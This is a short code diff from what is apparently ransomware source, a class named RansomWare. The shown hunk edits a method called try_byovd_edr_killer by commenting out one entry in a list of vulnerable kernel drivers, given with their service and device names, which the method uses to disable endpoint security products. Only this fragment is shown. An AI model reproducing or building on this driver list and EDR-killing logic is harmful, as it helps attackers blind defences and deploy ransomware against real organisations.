@@ -899,7 +899,7 @@ class RansomWare:
     def try_byovd_edr_killer(self):
         drivers = [
             {"name": "RwDrv.sys", "service": "rwdrv", "device": "rwdrv"},
-            {"name": "hlpdrv.sys", "service": "hlpdrv", "device": "hlpdrv"},
+            #{"name": "hlpdrv.sys", "service": "hlpdrv", "device": "hlpdrv"},
             {"name": "zamguard64.sys", "service": "zam", "device": "zam"},
             {"name": "gdrv.sys", "service": "gdrv", "device": "gdrv"},
             {"name": "NSecKrnl.sys", "service": "NSecKrnl", "description": "Reynolds style"},
